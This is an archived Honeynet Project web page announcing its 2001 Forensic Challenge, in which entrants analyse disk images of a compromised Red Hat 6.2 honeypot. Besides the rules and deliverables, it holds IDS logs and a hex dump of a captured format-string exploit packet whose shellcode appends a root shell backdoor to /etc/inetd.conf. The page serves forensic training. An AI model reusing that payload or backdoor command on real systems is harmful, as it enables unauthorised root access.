@@ -1,0 +1,415 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>The Honeynet Project: The Forensic Challenge</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<link href="/honeynet_style.css" rel="stylesheet" type="text/css">
+<style type="text/css">
+<!--
+body {
+	background-image: url(/images/honeynet_final_bg.jpg);
+	background-repeat: no-repeat;
+	background-position: 0px 0px;
+	background-color: #FFCC67;
+}
+-->
+</style>
+</head>
+<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+<table width="85%" border="0" cellpadding="0" cellspacing="0" bordercolor="#CCFF00">
+<tr>
+<td width="160"><a name="top"></a><img src="/images/spacer.gif" alt="spacer" width="200" height="100"></td>
+<td width="80%" align="right" valign="top">[an error occurred while processing this directive]
+</td>
+</tr>
+<tr valign="top">
+<td><table width="129" border=0 cellpadding=0 cellspacing=0>
+<tr>
+<td width="129"> <a href="/index.html"><img src="/images/nav_00_home.gif" alt="Home" name="home" width=129 height=28 border="0" id="home"></a></td>
+</tr>
+
+<tr>
+
+<tr>
+<td width="129"> <a href="/misc/project.html"><img src="/images/nav_01_about.gif" alt="About the Project" name="about" width=129 height=28 border="0" id="about"></a></td>
+</tr>
+
+<tr>
+<td> <a href="/misc/chall.html"><img src="/images/nav_04_challenges.gif" alt="Challenges" name="challenges" width=129 height=30 border="0" id="challenges"></a></td>
+</tr>
+
+<tr>
+<td> <a href="/speaking/index.html"><img src="/images/nav_05_presentations.gif" alt="Presentations" name="pres" width=129 height=31 border="0" id="pres"></a></td>
+</tr>
+
+<tr>
+<td> <a href="/papers/index.html"><img src="/images/nav_06_whitepapers.gif" alt="Whitepapers" name="white" width=129 height=30 border="0" id="white"></a></td>
+</tr>
+
+<tr>
+<td> <a href="/tools/index.html"><img src="/images/nav_07_tools.gif" alt="Tools" name="tools" width=129 height=30 border="0" id="tools"></a></td>
+</tr>
+
+<tr>
+<td> <a href="/book/index.html"><img src="/images/nav_08_our_book.gif" alt="Our Book" name="book" width=129 height=29 border="0" id="book"></a></td>
+</tr>
+
+<tr>
+<td> <a href="/funds/index.html"><img src="/images/nav_09_funding.gif" alt="Funding/Donations" name="fund" width=129 height=31 border="0" id="fund"></a></td>
+</tr>
+
+<tr>
+<td> <a href="/status/index.html"><img src="/images/nav_status.gif" alt="Status Reports" "name="status" width=129 height=31 border="0" id="status"></a></td>
+</tr>
+
+<tr>
+<td> <a href="/misc/mirror.html"><img src="/images/nav_10_mirrors.gif" alt="Mirrors" name="mirrors" width=129 height=28 border="0" id="mirrors"></a></td>
+</tr>
+
+
+</table>
+<br>
+
+<table border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td><img src="/images/spacer.gif" alt="spacer" width="19" height="5"></td>
+<td></td>
+</tr>
+
+<tr>
+<td></td>
+<td>
+<form method=GET action="https://www.google.com/search">
+<input type="text" name="q" maxlength="255" value="">
+<input type="hidden" name="domains" value="honeynet.org">
+<input type="hidden" name="sitesearch" value="honeynet.org">
+<input type="submit" name="btnG" value="Search">
+</form>
+</td>
+</tr>
+</table>
+
+
+</td>
+<td><table width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr valign="top">
+<td><img src="/images/spacer.gif" alt="spacer" width="5" height="50"></td>
+<td width="100%" valign="middle" class="introText">&nbsp;</td>
+</tr>
+</table>
+<table width="100%" border="0" cellpadding="0" cellspacing="0" bordercolor="#33FF99">
+<tr>
+<td bgcolor="#FFE6B3"><img src="/images/page_titles_for_challenge.jpg" alt="The Forensic Challenge" width="350" height="36"></td>
+</tr>
+<tr>
+<td bgcolor="#090804"><img src="/images/spacer.gif" alt="spacer" width="1" height="3"></td>
+</tr>
+<tr>
+<td valign="top" class="tableBg"><table width="100%" border="0" cellpadding="10" cellspacing="0">
+<tr>
+<td valign="top" bgcolor="#333333"><p class="intro">The Honeynet Project's Forensic
+Challenge was launched on January 15, 2001. This page links to all the information
+we've assembled about the Challenge. This index will help you quickly get to
+what you want. </p>
+</td>
+</tr>
+<tr>
+<td valign="top" bgcolor="F2EADD"><p> The Honeynet Project's <b>Forensic Challenge</b> was
+launched on January 15, 2001. This page links to all the information we've assembled
+about the Challenge. This index will help you quickly
+get to what you want.
+<ul class="pstyle">
+<li> <a href="#intro">Introduction</a></li>
+<li> <a href="#challenge">The Challenge</a></li>
+<li> <a href="#rules">The Rules</a></li>
+<li> <a href="images.html">Partition images</a></li>
+<li> <a href="faq.html">Frequently Asked Questions about the Challenge</a></li>
+<li> <a href="results/index.html">Results of the Challenge</a></li></ul>
+
+<p> <a name="intro" class="heading"> Introduction </a>
+</p>
+<p> Every day, incident handlers across the globe are faced with compromised
+systems, running some set of unknown programs, providing some kind of unintended
+service to an intruder who has taken control of someone else's -- YOUR, or your
+client's, or customer's -- computers. To most, the response is a matter of "get
+it back online
+ASAP and be done with it." This usually leads to an inadequate and ineffective
+response, not even knowing what hit you, with a high probability of repeated
+compromise.
+<P> On the law enforcement side, they are hampered by a flood of incidents and
+a lack of good data. A victim trying to keep a system running or
+doing a "quickie" job of cleanup usually means incidents are underreported and
+inadequate handling of the evidence leads to no evidence, or tainted evidence.
+There has to be a better way to meet the needs of incident handlers and system
+administrators, as well as law enforcement, if Internet crime is going to be
+managed and not run amok. One possible answer is effective forensic analysis
+skills -- widespread knowledge of tools and techniques -- to preserve data, analyze
+it, and produce meaningful reports and damage estimates to your organization's
+management, to other incident response teams and system administrators, and to
+law enforcement.
+<P> Enter the Honeynet Project. One of the primary goals of the Honeynet Project
+is to find order in chaos by letting the attackers do their thing, and allowing
+the defenders to learn from the experience and improve. The latest challenge,
+inspired by the Honeynet Project's founder Lance Spitzner, is the Forensic Challenge.
+Only this time, we're opening it up to
+anyone who wants to join in.
+<P><a name="challenge" class="heading"> The Challenge </a>
+<P> The Forensic Challenge is an effort to allow incident handlers around the
+world to all look at the same data -- an image reproduction of the same compromised
+system -- and to see who can dig the most out of that system and communicate
+what they've found in a concise manner. This is a nonscientific study of tools,
+techniques, and procedures applied to postcompromise incident handling. The challenge
+is to have fun, to solve a common real world problem, and for everyone to learn
+from the process. If what I've said already isn't enough to get you interested,
+Foundstone is generously offering copies of their extremely
+popular "Hacking Exposed" (Second Edition) book for the 20 best submissions.
+<P class="bold"> To get you started, here are the basic facts about the compromise:
+<UL class="pstyle">
+  <LI> The system was running a default Red Hat Linux 6.2 Server installation.</LI>
+  <LI> The system's time zone was set to GMT-0600 (CST).</LI>
+  <LI> The following was noted and logged by the Project's IDS of choice, <a href="http://www.snort.org">snort</a>.</LI></ul>
+
+  <pre>Nov 7 23:11:06 lisa snort[1260]: 
+RPC Info Query: 216.216.74.2:963 -> 172.16.1.107:111
+
+Nov 7 23:11:31 lisa snort[1260]: 
+spp_portscan: portscan status from 216.216.74.2: 2 connections across 1 hosts: TCP(2), UDP(0)
+
+Nov 7 23:11:31 lisa snort[1260]: 
+IDS08 - TELNET - daemon-active: 172.16.1.101:23 -> 216.216.74.2:1209
+
+Nov 7 23:11:34 lisa snort[1260]: 
+IDS08 - TELNET - daemon-active: 172.16.1.101:23 -> 216.216.74.2:1210
+
+Nov 7 23:11:47 lisa snort[1260]: 
+spp_portscan: portscan status from 216.216.74.2: 2 connections across 2 hosts: TCP(2), UDP(0)
+
+Nov 7 23:11:51 lisa snort[1260]: 
+IDS15 - RPC - portmap-request-status: 216.216.74.2:709 -> 172.16.1.107:111
+
+Nov 7 23:11:51 lisa snort[1260]: 
+IDS362 - MISC - Shellcode X86 NOPS-UDP: 216.216.74.2:710 -> 172.16.1.107:871
+</pre>
+
+  <pre>11/07-23:11:50.870124 216.216.74.2:710 -> 172.16.1.107:871
+UDP TTL:42 TOS:0x0 ID:16143
+Len: 456
+3E D1 BA B6 00 00 00 00 00 00 00 02 00 01 86 B8  >...............
+00 00 00 01 00 00 00 02 00 00 00 00 00 00 00 00  ................
+00 00 00 00 00 00 00 00 00 00 01 67 04 F7 FF BF  ...........g....
+04 F7 FF BF 05 F7 FF BF 05 F7 FF BF 06 F7 FF BF  ................
+06 F7 FF BF 07 F7 FF BF 07 F7 FF BF 25 30 38 78  ............%08x
+20 25 30 38 78 20 25 30 38 78 20 25 30 38 78 20   %08x %08x %08x
+25 30 38 78 20 25 30 38 78 20 25 30 38 78 20 25  %08x %08x %08x %
+30 38 78 20 25 30 38 78 20 25 30 38 78 20 25 30  08x %08x %08x %0
+38 78 20 25 30 38 78 20 25 30 38 78 20 25 30 38  8x %08x %08x %08
+78 20 25 30 32 34 32 78 25 6E 25 30 35 35 78 25  x %0242x%n%055x%
+6E 25 30 31 32 78 25 6E 25 30 31 39 32 78 25 6E  n%012x%n%0192x%n
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 EB 4B 5E 89 76 AC 83 EE 20 8D 5E 28 83 C6  ...K^.v... .^(..
+20 89 5E B0 83 EE 20 8D 5E 2E 83 C6 20 83 C3 20   .^... .^... ..
+83 EB 23 89 5E B4 31 C0 83 EE 20 88 46 27 88 46  ..#.^.1... .F'.F
+2A 83 C6 20 88 46 AB 89 46 B8 B0 2B 2C 20 89 F3  *.. .F..F..+, ..
+8D 4E AC 8D 56 B8 CD 80 31 DB 89 D8 40 CD 80 E8  <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="18365636364e3636362936363658363636">[email&#160;protected]</a>
+B0 FF FF FF 2F 62 69 6E 2F 73 68 20 2D 63 20 65  ..../bin/sh -c e
+63 68 6F 20 34 35 34 35 20 73 74 72 65 61 6D 20  cho 4545 stream
+74 63 70 20 6E 6F 77 61 69 74 20 72 6F 6F 74 20  tcp nowait root
+2F 62 69 6E 2F 73 68 20 73 68 20 2D 69 20 3E 3E  /bin/sh sh -i >>
+20 2F 65 74 63 2F 69 6E 65 74 64 2E 63 6F 6E 66   /etc/inetd.conf
+3B 6B 69 6C 6C 61 6C 6C 20 2D 48 55 50 20 69 6E  ;killall -HUP in
+65 74 64 00 00 00 00 09 6C 6F 63 61 6C 68 6F 73  etd.....localhos
+74 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  t...............
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................<span class="bold">
+</span></pre>  <p><span class="bold">A bit-image copy of the active partitions was obtained, as detailed here: </span> </p>
+  <pre>/dev/hda8       /
+/dev/hda1       /boot
+/dev/hda6       /home
+/dev/hda5       /usr
+/dev/hda7       /var
+/dev/hda9       swap
+</pre>  <p class="bold"> MD5 Checksums (both uncompressed and GNU gzip compressed):
+  </p>
+ <pre>a1dd64dea2ed889e61f19bab154673ab  honeypot.hda1.dd
+c1e1b0dc502173ff5609244e3ce8646b  honeypot.hda5.dd
+4a20a173a82eb76546a7806ebf8a78a6  honeypot.hda6.dd
+1b672df23d3af577975809ad4f08c49d  honeypot.hda7.dd
+8f244a87b8d38d06603396810a91c43b  honeypot.hda8.dd
+b763a14d2c724e23ebb5354a27624f5f  honeypot.hda9.dd
+
+f8e5cdb6f1109035807af1e141edd76d  honeypot.hda1.dd.gz
+6ef29886be0d9140ff325fe463fce301  honeypot.hda5.dd.gz
+8eb98a676dbffad563896a9b1e99a95f  honeypot.hda6.dd.gz
+be215f3e8c2602695229d4c7810b9798  honeypot.hda7.dd.gz
+b4ff10d5fd1b889a6237fa9c2979ce77  honeypot.hda8.dd.gz
+9eed26448c881b53325a597eed8685ea  honeypot.hda9.dd.gz
+</pre>
+ <p>Please be aware that these are new images. This is <b>not</b> a system that the
+Honeynet Project has previously written about or discussed publically. (I.e.,
+you won't get any hints from previous Honeynet papers.) The images were edited
+to anonymize the system. Only the hostname was modified. Everyone is using the
+same data, so any
+anomalies caused by this editing will be identical.</p>
+<P class="bold"> The image files can be mounted on Linux systems using the loopback interface
+like this:
+<pre> # mkdir /t
+ # mount -o ro,loop,nodev,noexec honeypot.hda8.dd /t
+ # mount -o ro,loop,nodev,noexec honeypot.hda1.dd /t/boot
+ [ etc... ]
+</pre>
+<p> Its now your job -- should you choose to accept it! -- to figure out the
+Who, What, Where, When, How, and maybe even the Why of this compromise. We don't
+expect that everyone undertaking the challenge can or will address all of the
+following items, but the list below of questions and deliverables is provided
+as a guideline for what
+to produce and what to focus on:
+<OL class="pstyle">
+  <LI> Identify the intrusion method, its date, and time. (Assume the clock on
+  the IDS was synchronized with an NTP reference time source.)</LI>
+  <LI> Identify as much as possible about the intruder(s).</LI>
+  <LI> List all the files that were added/modified by the intruder. Provide an
+  analysis of these programs (including decompilation or disassembly where necessary
+  to determine their function and role in the incident.)</LI>
+  <LI> Was there a sniffer or password harvesting program installed? If so, where
+  and what files are associated with it?</LI>
+  <LI> Was there a "rootkit" or other post-concealment trojan horse programs
+  installed on the system? If so, what operating system programs were replaced
+  and how could you get around them? Hint: If you don't know what a "rootkit" is,
+  read this:
+  <P> <a href="https://staff.washington.edu/dittrich/misc/faqs/rootkits.faq"> http://staff.washington.edu/dittrich/misc/faqs/rootkits.faq</a> </LI>
+  <LI>
+  <P>What
+  is publicly known about the source of any programs found on the system? (e.g.,
+  their authors, where source code can be found, what exploits or advisories
+  exist about them, etc.)  
+  </LI>
+  <LI> Build a time line of events and provide a detailed analysis of activity
+  on the system, noting sources of supporting or confirming evidence (elsewhere
+  on the system or compared with a known "clean" system of similar configuration.)</LI>
+  <LI> Provide a report suitable for management or news media (general aspects
+  of the intrusion without specific identifying data).</LI>
+  <LI> Provide an advisory for use within the home organization (a fictitious
+  university, "honeyp.edu", in this case, where I hold an honorary Doctorate,
+  by the way) to explain the key aspects of the vulnerability exploited, how
+  to detect and defend against this vulnerability, and how to determine if other
+  systems were similarly compromised.</LI>
+  <LI> Produce a cost-estimate for this incident using the following guidelines
+  and method:
+  <P> <a href="https://staff.washington.edu/dittrich/misc/faqs/incidentcosts.faq"> http://staff.washington.edu/dittrich/misc/faqs/incidentcosts.faq</a>
+  <P> To simplify and to normalize the results, assume that your annual salary
+    is $70,000 and that there are no user-related costs. (If you work as a team,
+    break out hours by person, but all members should use the same annual salary.
+    Please also include a brief description of each investigator's number of
+    years of experience in the fields of system administration, programming,
+    and security, just to help us compare the number of hours spent with other
+    entrants).
+  </LI>
+</OL>
+<P class="bold"> To summarize (and standardize) the deliverables, please produce the following:
+<pre>   File                   Contents
+   ---------------------------------------------------------------------
+   index.txt              Index of files/directories submitted
+                          (including any not listed below)
+   timestamp.txt          Timestamp of MD5 checksums of all files
+                          listed and submitted (dating when produced
+                          -- see deadline information below)
+   costs.txt              Incident cost-estimate
+   evidence.txt           Time line and detailed (technical) analysis.
+                          (Use an Appendix, and/or mark answers to
+                          questions above with "[Q1]", etc.)
+   summary.txt            Management and media (non-technical) summary
+   advisory.txt           Advisory for consumption by other system
+                          administrators and incident handlers within
+                          your organization
+   files.tar              Any other files produced during analysis and/or
+                          excerpts (e.g., <tt>strings</tt> output or
+                          dissassembly listings) from files on the
+                          compromised file system, which are referenced in
+                          the previous files
+</pre>
+<a name="rules" class="heading">The Rules</a>
+<ul class="pstyle">
+  <li> You are free to use any tools or techniques that you choose, provided
+  that the judges are able to readily interpret your results and duplicate or
+  verify their accuracy using publicly available means (i.e., don't expect us
+  all to have a copy of your favorite "Law Enforcement Only" or multi-hundred
+  dollar commercial Windows-only tool). A good publicly available free forensic
+  toolkit is Dan Farmer and Wietse Venema's <a href="http://www.porcupine.org/forensics/tct.html"> The
+  Coroner's Toolkit (TCT)</a>. If you want examples of the use of TCT, or other
+  tools/techniques, see the Forensics section of the following web page:
+  <P> <a href="https://staff.washington.edu/dittrich/"> http://staff.washington.edu/dittrich/</a>
+  <P> No matter what tools/methods you choose, please make sure you explain
+    them in your analysis and cite references to resources (e.g., RFCs, CERT
+    or SANS "how to" documents) to help others learn by example. Don't forget:
+    this is a Honeynet Project brainchild, so learning is what it's all about.
+    And fun. It's all about learning and fun. Oh yeah, and security. Learning,
+    fun, AND security. ;)
+<li> You may work as a team, but if your entry is selected as a Top 20, you'll
+    have to fight over one copy of the book.
+<li> Deliver the results of the analysis in such a way that the judges
+      can quickly and easily consume the information, and such that its authenticity,
+      time of production, and integrity can be verified independently. (e.g.,
+      ISO 9660 CD-ROM or <tt>.tar</tt> archive, with digital time stamps, and
+      PGP signatures and/or MD5 checksums.)
+<P class="bold">Please DO NOT SEND COPIES OF COMPLETE FILES FROM THE FILE SYSTEM.
+  We already have a copy of the file system and its contents. Just note the path
+(e.g., "[See file /bin/foo]"). <a name="deadline"></a>
+  <li> All submissions <b>MUST</b> be time stamped prior to 00:00 GMT on
+        Monday, February 19, 2001 [<b>not</b> February 15 as the announcement
+        email said], and delivery to the judges initiated later that same day.
+        (This is to accommodate submissions on IS0 9660 format CD-ROM, which
+        should be postmarked by this time. The digital time stamps and postmarks
+        will be used to determine the 20 "Hacking Exposed" book winners.) One
+        free digital time stamping service you can use is <a
+href="http://www.itconsult.co.uk/stamper.htm">Stamper</a> .
+  <li> All submissions should be sent (or shipping address arranged,
+          if CD-ROMs are being produced) to <a href="/cdn-cgi/l/email-protection#05666d646969606b6260456d6a6b607c6b60712b6a77623a5670676f60667138516d6025436a77606b766c6625466d646969606b62600f567067686c76766c6a6b"><span class="__cf_email__" data-cfemail="45262d242929202b2220052d2a2b203c2b20316b2a3722">[email&#160;protected]</span></a>.
+   <li> The person who hacked the box is NOT eligible, nor are members
+            of the Honeynet Project. Members of the companies employing Honeynet
+            Project members are eligible (and encouraged!) to enter, but their
+            entries (even if Top 20) will not receive copies of "Hacking Exposed." The
+            books go to other entrants.
+  <li> Entries must be written in English (UK and Aussie English
+              accepted, but go light on the regional slang, please! I only have
+              a copy of "<i>Best of Aussie Slang</i>," and the other judges don't
+              live in Seattle.)
+  <li> Only one entry per household, please. Must be sentient to
+                enter. Sorry, no Ginsu Knives come with this offer! </ul>
+<p>Submissions will be judged by a panel of experts and winners selected and announced
+on Monday, March 19, 2001. All decisions of the judges are final (no recounts
+or legal challenges by teams of grossly
+overpaid lawyers will be tolerated!).</p>
+<P> After the winners are announced, all entries will be posted for the security
+community to review. We hope that the community can better learn from and improve
+from all the
+different techniques that different people and organizations use.
+<p> Also, we wouldn't be the Honeynet Project if we didn't capture all of the
+blackhat's keystrokes as he exploited, accessed, and modified the honeypot! We
+will release the Honeypot Project's analysis of the hacked system, as well as
+the blackhat's keystrokes, along
+with the results of the Challenge on March 19.
+<P> Good luck, and have fun!
+<P> Dave Dittrich</ul></td>
+</tr>
+</table>
+<p><br>
+<a href="#top"><img src="/images/back.gif" alt="Back to Top" width="82" height="20" border="0"></a></p>
+<p>&nbsp;</p>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+var pageTracker = _gat._getTracker("UA-3659112-1");
+pageTracker._initData();
+pageTracker._trackPageview();
+</script>
+</body>
+</html>
